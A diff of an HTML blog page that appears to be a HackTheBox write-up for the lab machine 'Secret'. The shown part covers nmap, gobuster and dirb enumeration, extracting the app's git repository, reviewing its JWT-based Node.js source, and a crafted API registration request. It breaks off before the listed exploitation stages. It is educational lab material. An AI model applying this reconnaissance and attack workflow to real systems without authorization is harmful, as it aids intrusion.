@@ -6,7 +6,7 @@
   
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="It has been a long time since our last HackTheBox write-up, so today we will get into a two and a half months old machine - Secret
+<meta name="description" content="It has been a long time since our last HackTheBox write-up, so today we will get into a two and a half months old machine - Secret.
 Enumeration Network scan As usual, nmap should provide us an elaborated report on the target&amp;rsquo;s network.
 ┌──(legiahuyy㉿kali)-[~/Desktop/HTB/Boxes/Secret] └─$ nmap -sV -sC 10.10.11.120 -v -oA ./nmap/Secret ┌──(legiahuyy㉿kali)-[~/Desktop/HTB/Boxes/Secret] └─$ cat ./nmap/Secret.nmap # Nmap 7.92 scan initiated Wed Jan 12 21:44:12 2022 as: nmap -sV -sC -v -oA ." />
 <meta name="keywords" content="infosec, pwn, ctf, challenges, hackthebox, reverse" />
@@ -43,13 +43,15 @@ Enumeration Network scan As usual, nmap should provide us an elaborated report o
 <meta property="og:locale" content="en" />
 <meta property="og:type" content="article" />
 <meta property="og:title" content="HackTheBox: Secret">
-<meta property="og:description" content="It has been a long time since our last HackTheBox write-up, so today we will get into a two and a half months old machine - Secret
+<meta property="og:description" content="It has been a long time since our last HackTheBox write-up, so today we will get into a two and a half months old machine - Secret.
 Enumeration Network scan As usual, nmap should provide us an elaborated report on the target&amp;rsquo;s network.
 ┌──(legiahuyy㉿kali)-[~/Desktop/HTB/Boxes/Secret] └─$ nmap -sV -sC 10.10.11.120 -v -oA ./nmap/Secret ┌──(legiahuyy㉿kali)-[~/Desktop/HTB/Boxes/Secret] └─$ cat ./nmap/Secret.nmap # Nmap 7.92 scan initiated Wed Jan 12 21:44:12 2022 as: nmap -sV -sC -v -oA ." />
 <meta property="og:url" content="https://legiahuyy.github.io/blog/en/posts/htb-secret/" />
 <meta property="og:site_name" content="Yet, another infosec blog" />
 
-  <meta property="og:image" content="D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-01-13_09-38.png">
+  
+    <meta property="og:image" content="https://legiahuyy.github.io/blog/en/img/favicon/green.png">
+  
 
 <meta property="og:image:width" content="2048">
 <meta property="og:image:height" content="1024">
@@ -203,7 +205,7 @@ Enumeration Network scan As usual, nmap should provide us an elaborated report o
       <span class="post-author">:: The Archivist</span>
     
     
-      <span class="post-reading-time">:: 2 min read (297 words)</span>
+      <span class="post-reading-time">:: 17 min read (3583 words)</span>
     
   </div>
 
@@ -219,10 +221,6 @@ Enumeration Network scan As usual, nmap should provide us an elaborated report o
   </span>
   
   
-  <img src="#ZgotmplZ"
-    class="post-cover"
-    alt="HackTheBox: Secret"
-    title="Cover Image" />
 
 
   
@@ -238,6 +236,14 @@ Enumeration Network scan As usual, nmap should provide us an elaborated report o
       <ul>
         <li><a href="#network-scan">Network scan</a></li>
         <li><a href="#web-server">Web-server</a></li>
+        <li><a href="#source-code-analysis">Source code analysis</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#stage-1-commits-history-and-jwt-secret-key">Stage 1: Commits history and JWT secret key</a></li>
+        <li><a href="#stage-2-remote-code-execution-to-reverse-shell">Stage 2: Remote Code <em>Exec()ution</em> to reverse shell</a></li>
+        <li><a href="#stage-3-privilege-escalation">Stage 3: Privilege Escalation</a></li>
       </ul>
     </li>
   </ul>
@@ -246,7 +252,7 @@ Enumeration Network scan As usual, nmap should provide us an elaborated report o
   
 
   <div class="post-content"><div>
-        <p>It has been a long time since our last HackTheBox write-up, so today we will get into a two and a half months old machine - Secret</p>
+        <p>It has been a long time since our last HackTheBox write-up, so today we will get into a two and a half months old machine - Secret.</p>
 <h2 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <h3 id="network-scan">Network scan<a href="#network-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p>As usual, <code>nmap</code> should provide us an elaborated report on the target&rsquo;s network.</p>
@@ -282,9 +288,736 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 </code></pre></div><p>Based on the output from NMAP, the web-server and a NodeJS service is running on port <code>80</code> and <code>3000</code>, respectively. There is also a SSH listening on port <code>22</code>, however, it is not exploitable even in these easy-rated machines, at least from my own experience. So, let us pay our attention to the former two.</p>
 <h3 id="web-server">Web-server<a href="#web-server" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Visiting either <code>10.10.11.120:80</code> or <code>10.10.11.120:3000</code> does provide you with the same webpage.</p>
 <p><img src="D:%5CDevelopment%5Cgithub%5Crepos%5Cimage-host%5C2022-01-13-HTB-Secret%5Csecret1.gif" alt=""></p>
-<p>You can see why this box is rated easy since it presumably enables us to download its source code. Beside that and the <strong>Live Demo</strong> feature, there are no other feasible or potential vectors around but some protracted documentation.</p>
-<p>g</p>
+<p>You can see why this box is rated easy since it presumably enables us to download its source code in the last section. Beside that and the <strong>Live Demo</strong> feature, there are no other feasible or potential vectors around but some protracted documentation.</p>
+<p><strong>Live Demo</strong> redirects us to a assumed API endpoint running on the server.</p>
+<p><img src="D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-01-14_08-08.png" alt=""></p>
+<p>Normally, we would use auxiliaries to enumerate the endpoint, and <code>dirb</code>, <code>gobuster</code> are my favorites. There is, nevertheless, a trivial problem that when using <code>gobuster</code>, you will probably encounter the following error.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>legiahuyy㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/HTB/Boxes/Secret<span style="color:#f92672">]</span>
+└─$ gobuster dir -q -u http://10.10.11.120/api/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,bak,txt,html -t <span style="color:#ae81ff">50</span> -o gobuster.txt
+Error: the server returns a status code that matches the provided options <span style="color:#66d9ef">for</span> non existing urls. http://10.10.11.120/api/767c3163-5f9d-4235-b2ec-3c8766da50ab <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">200</span> <span style="color:#f92672">(</span>Length: 93<span style="color:#f92672">)</span>. To <span style="color:#66d9ef">continue</span> please exclude the status code, the length or use the --wildcard switch
+</code></pre></div><p>This happens due to the web-server is prone to be configurated to always response with <code>200 OK</code> code. You can verify this again by sending a <code>CURL</code> request to a non-existing page.</p>
+<p><img src="D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-01-14_08-50.png" alt=""></p>
+<p>On that account, we have to exclude <code>200 OK</code> responses and, hence, our command should look like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>legiahuyy㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/HTB/Boxes/Secret<span style="color:#f92672">]</span>
+└─$ gobuster dir -q -u http://10.10.11.120/api/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b <span style="color:#e6db74">&#34;200&#34;</span> -x php,bak,txt,html -t <span style="color:#ae81ff">50</span> -o gobuster.txt
+</code></pre></div><p>On the other side, <code>dirb</code> works like a charm.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>legiahuyy㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/HTB/Boxes/Secret<span style="color:#f92672">]</span>
+└─$ dirb http://10.10.11.120/api/ /usr/share/wordlists/dirb/common.txt
+
+...
+-----------------
+
+GENERATED WORDS: <span style="color:#ae81ff">4612</span>                                                  
+
+---- Scanning URL: http://10.10.11.120/api/ ----
++ http://10.10.11.120/api/logs <span style="color:#f92672">(</span>CODE:401|SIZE:13<span style="color:#f92672">)</span>                      
++ http://10.10.11.120/api/Logs <span style="color:#f92672">(</span>CODE:401|SIZE:13<span style="color:#f92672">)</span>                      
++ http://10.10.11.120/api/priv <span style="color:#f92672">(</span>CODE:401|SIZE:13<span style="color:#f92672">)</span>                      
+                                                                       
+-----------------
+END_TIME: Thu Jan <span style="color:#ae81ff">13</span> 20:28:03 <span style="color:#ae81ff">2022</span>
+DOWNLOADED: <span style="color:#ae81ff">4612</span> - FOUND: <span style="color:#ae81ff">3</span>
+...
+</code></pre></div><p>All these enumerated paths, however, are inaccessible without valid credentials as their responses are <code>401</code> with an <strong>Access Denied</strong> message. Despite being restricted, we are able to get the gist of what we should do next.</p>
+<p><img src="D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-01-15_10-41.png" alt=""></p>
+<h3 id="source-code-analysis">Source code analysis<a href="#source-code-analysis" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>In this step, let us have a look at the open-source project provided which can be download at the bottom of the homepage.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>legiahuyy㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/HTB/Boxes/Secret<span style="color:#f92672">]</span>
+└─$ tree ./www/local-web -a -L <span style="color:#ae81ff">2</span> | tee ./www/local-web/tree.txt 
+./www/local-web
+├── .env
+├── .git
+│   ├── branches
+│   ├── COMMIT_EDITMSG
+│   ├── config
+│   ├── description
+│   ├── HEAD
+│   ├── hooks
+│   ├── index
+│   ├── info
+│   ├── logs
+│   ├── objects
+│   └── refs
+├── index.js
+├── model
+│   └── user.js
+├── node_modules
+...
+├── package.json
+├── package-lock.json
+├── public
+│   ├── assets
+│   └── code
+├── routes
+│   ├── auth.js
+│   ├── forgot.js
+│   ├── private.js
+│   └── verifytoken.js
+├── src
+│   ├── routes
+│   └── views
+├── tree.txt
+└── validations.js
+
+<span style="color:#ae81ff">215</span> directories, <span style="color:#ae81ff">17</span> files
+
+</code></pre></div><p>From the source tree, it is clearly a git repository as there is a <code>.git</code> directory and thus, we would like to dump all the content therein using <a href="https://github.com/internetwache/GitTools">GitTools</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>legiahuyy㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/HTB/Boxes/Secret<span style="color:#f92672">]</span>
+└─$ git clone --recursive https://github.com/internetwache/GitTools.git .
+
+┌──<span style="color:#f92672">(</span>legiahuyy㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/HTB/Boxes/Secret<span style="color:#f92672">]</span>
+└─$ ./GitTools/Extractor/extractor.sh 
+<span style="color:#75715e">###########</span>
+<span style="color:#75715e"># Extractor is part of https://github.com/internetwache/GitTools</span>
+<span style="color:#75715e">#</span>
+<span style="color:#75715e"># Developed and maintained by @gehaxelt from @internetwache</span>
+<span style="color:#75715e">#</span>
+<span style="color:#75715e"># Use at your own risk. Usage might be illegal in certain circumstances. </span>
+<span style="color:#75715e"># Only for educational purposes!</span>
+<span style="color:#75715e">###########</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> USAGE: extractor.sh GIT-DIR DEST-DIR
+
+┌──<span style="color:#f92672">(</span>legiahuyy㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/HTB/Boxes/Secret<span style="color:#f92672">]</span>
+└─$ ./GitTools/Extractor/extractor.sh ./www/local-web/ ./www/extracted
+</code></pre></div><p>Since the tool need time to extract our target&rsquo;s repository, we can inspect other objects to save some time. And as you may or may not have noticed, neither back-end nor front-end is my favorite but fortunately, I can still read JS to some extent as I did some Node projects in the past. It is not necessary to go through every files and objects in the source code but to narrow it down, and in this case, we want to pay our attention to the <code>routes</code> directory.</p>
+<pre tabindex="0"><code>├── routes
+│   ├── auth.js
+│   ├── forgot.js
+│   ├── private.js
+│   └── verifytoken.js
+...
+</code></pre><p><code>auth.js</code>, <code>private.js</code> and <code>verifytoken.js</code>, these are undoubtedly sensitive files that often reveal a great variety of attack vectors, even in practical scenarios. In addition, it is also worth mentioning <code>index.js</code>, this lets us know how the server operates and utilizes its endpoints.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#75715e">// index.js
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>);
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">mongoose</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;mongoose&#39;</span>);
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">dotenv</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;dotenv&#39;</span>)
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">privRoute</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;./routes/private&#39;</span>)
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">bodyParser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;body-parser&#39;</span>)
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">express</span>.<span style="color:#66d9ef">static</span>(<span style="color:#e6db74">&#39;public&#39;</span>))
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#39;/assets&#39;</span>, <span style="color:#a6e22e">express</span>.<span style="color:#66d9ef">static</span>(<span style="color:#a6e22e">__dirname</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;public/assets&#39;</span>))
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#39;/download&#39;</span>, <span style="color:#a6e22e">express</span>.<span style="color:#66d9ef">static</span>(<span style="color:#a6e22e">__dirname</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;public/source&#39;</span>))
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">&#39;views&#39;</span>, <span style="color:#e6db74">&#39;./src/views&#39;</span>)
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">&#39;view engine&#39;</span>, <span style="color:#e6db74">&#39;ejs&#39;</span>)
+
+
+<span style="color:#75715e">// import routs 
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">authRoute</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;./routes/auth&#39;</span>);
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">webroute</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;./src/routes/web&#39;</span>)
+
+<span style="color:#a6e22e">dotenv</span>.<span style="color:#a6e22e">config</span>();
+<span style="color:#75715e">//connect db 
+</span><span style="color:#75715e"></span>
+<span style="color:#a6e22e">mongoose</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">DB_CONNECT</span>, { <span style="color:#a6e22e">useNewUrlParser</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span> }, () =&gt;
+    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;connect to db!&#34;</span>)
+);
+
+<span style="color:#75715e">//middle ware 
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">express</span>.<span style="color:#a6e22e">json</span>());
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#39;/api/user&#39;</span>,<span style="color:#a6e22e">authRoute</span>)
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#39;/api/&#39;</span>, <span style="color:#a6e22e">privRoute</span>)
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#a6e22e">webroute</span>)
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#ae81ff">3000</span>, () =&gt; <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;server up and running&#34;</span>));
+
+</code></pre></div><p>Thanks to it, we can tell that <code>/api/user</code> is using <code>auth.js</code> and <code>/api/</code> is using <code>private.js</code> by looking at its imports, respectively.</p>
+<p>Inspecting <code>auth.js</code> divulges another valuable POST endpoint - <code>/api/user/register</code> as well as its validating condition which consists of <code>name</code>, <code>email</code> and <code>password</code>. Moreover, JWT (JSON Web Token) is also being used as a login authorization method; hence, we have to find a secret key which is being retrieved from <code>process.env.TOKEN_SECRET</code> or the <code>.env</code> file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">router</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>).<span style="color:#a6e22e">Router</span>();
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">User</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;../model/user&#39;</span>);
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">bcrypt</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;bcryptjs&#39;</span>)
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">jwt</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;jsonwebtoken&#39;</span>)
+<span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">registerValidation</span>, <span style="color:#a6e22e">loginValidation</span>} <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;../validations&#39;</span>)
+
+<span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/register&#39;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+
+    <span style="color:#75715e">// validation
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">error</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">registerValidation</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>)
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">error</span>) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">error</span>.<span style="color:#a6e22e">details</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">message</span>);
+
+    <span style="color:#75715e">// check if user exists
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">emailExist</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">User</span>.<span style="color:#a6e22e">findOne</span>({<span style="color:#a6e22e">email</span><span style="color:#f92672">:</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">email</span>})
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">emailExist</span>) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;Email already Exist&#39;</span>)
+
+    <span style="color:#75715e">// check if user name exist 
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">unameexist</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">User</span>.<span style="color:#a6e22e">findOne</span>({ <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">name</span> })
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">unameexist</span>) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;Name already Exist&#39;</span>)
+
+    <span style="color:#75715e">//hash the password
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">salt</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">bcrypt</span>.<span style="color:#a6e22e">genSalt</span>(<span style="color:#ae81ff">10</span>);
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">hashPaswrod</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">bcrypt</span>.<span style="color:#a6e22e">hash</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">password</span>, <span style="color:#a6e22e">salt</span>)
+
+
+    <span style="color:#75715e">//create a user 
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">User</span>({
+        <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">name</span>,
+        <span style="color:#a6e22e">email</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">email</span>,
+        <span style="color:#a6e22e">password</span><span style="color:#f92672">:</span><span style="color:#a6e22e">hashPaswrod</span>
+    });
+
+    <span style="color:#66d9ef">try</span>{
+        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">saveduser</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">save</span>();
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>({ <span style="color:#a6e22e">user</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">name</span>})
+    
+    }
+    <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">err</span>){
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">err</span>)
+    }
+
+});
+
+
+<span style="color:#75715e">// login 
+</span><span style="color:#75715e"></span>
+<span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/login&#39;</span>, <span style="color:#66d9ef">async</span>  (<span style="color:#a6e22e">req</span> , <span style="color:#a6e22e">res</span>) =&gt; {
+
+    <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">error</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">loginValidation</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>)
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">error</span>) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">error</span>.<span style="color:#a6e22e">details</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">message</span>);
+
+    <span style="color:#75715e">// check if email is okay 
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">User</span>.<span style="color:#a6e22e">findOne</span>({ <span style="color:#a6e22e">email</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">email</span> })
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">user</span>) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;Email is wrong&#39;</span>);
+
+    <span style="color:#75715e">// check password 
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">validPass</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">bcrypt</span>.<span style="color:#a6e22e">compare</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">password</span>, <span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">password</span>)
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">validPass</span>) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;Password is wrong&#39;</span>);
+
+
+    <span style="color:#75715e">// create jwt 
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">sign</span>({ <span style="color:#a6e22e">_id</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">id</span>, <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">name</span> , <span style="color:#a6e22e">email</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">email</span>}, <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">TOKEN_SECRET</span> )
+    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;auth-token&#39;</span>, <span style="color:#a6e22e">token</span>).<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">token</span>);
+
+})
+
+<span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">use</span>(<span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) {
+    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({
+        <span style="color:#a6e22e">message</span><span style="color:#f92672">:</span> {
+
+            <span style="color:#a6e22e">message</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;404 page not found&#34;</span>,
+            <span style="color:#a6e22e">desc</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;page you are looking for is not found. &#34;</span>
+        }
+    })
+});
+
+<span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">router</span>
+</code></pre></div><p>Henceforth, we do know how to register a new user, so let us try sending a POST request to <code>/api/user/register</code> and see whether it is a valid API or not.</p>
+<p>You can try either Burpsuite or cURL should work properly and return the same response.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">POST</span> /api/user/register <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.10.11.120</span>
+User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</span>
+Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
+Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
+Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/json</span>
+Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+If-None-Match<span style="color:#f92672">:</span> <span style="color:#ae81ff">W/&#34;5d-ArPF0JBxjtRzy3wpSVF4hSVtK4s&#34;</span>
+Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">28</span>
+
+{
+	<span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;legiahuyy&#34;</span>
+}
+
+<span style="color:#75715e">// Response
